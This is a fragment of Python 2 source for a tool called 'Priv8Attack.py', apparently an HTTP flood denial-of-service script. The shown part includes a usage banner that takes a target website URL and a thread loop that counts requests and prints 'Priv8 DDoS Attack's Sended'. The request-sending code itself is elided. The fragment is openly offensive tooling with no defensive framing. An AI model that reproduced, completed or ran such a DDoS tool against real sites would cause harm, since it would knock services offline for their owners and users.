...
def usage():
	print 'Usage: Priv8Attack.py (url)'
	print 'Example: Priv8Attack.py http://www.website.com/'
	print 'Example: Created~BY@Priv8Attack#'	
	print "\a"
print \
"""                                                       
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "#~~~>Priv8 DDoS Attack's Sended: %d Sending more<~~~#" % (request_counter)
				previous=request_counter
		if flag==2:
